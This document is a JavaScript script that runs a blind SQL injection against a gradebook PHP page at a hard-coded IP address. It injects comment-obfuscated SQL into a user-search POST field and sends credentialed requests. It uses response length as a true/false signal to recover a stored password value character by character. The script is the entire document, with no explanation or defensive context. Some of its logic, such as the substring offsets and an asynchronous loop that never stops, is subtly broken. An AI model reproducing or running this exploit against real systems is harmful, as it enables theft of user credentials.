var params = "submit=&search_user=ramdomstring%'/**/or/**/length(u.password)=69";
var result = "";
for(var i = 0; i < 70; i++) {
	var found = false;
	var char = 0;
	while(!found && char < 200){
		var newCharSearch = "/**/and/**/ascii(substring(lower(u.password)," + i.toString() + "," + i.toString() + "))=" + char.toString();
		var trueParams = params + newCharSearch + "--";
		var xmlHttp = new XMLHttpRequest();
		console.log(trueParams);
		xmlHttp.open("POST", "http://128.83.34.154/gradebook.php", true);
		xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xmlHttp.withCredentials = true;
		xmlHttp.send(trueParams);
		xmlHttp.onreadystatechange = (function(char) { // Call a function when the state changes.
			return function() {
				if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
						if(this.responseText.length > 2500){
							window.result += String.fromCharCode(char);
							console.log(window.result);
							found = true;
						}
					}
				}
			}
		) (char);
    		char++;
	}
}


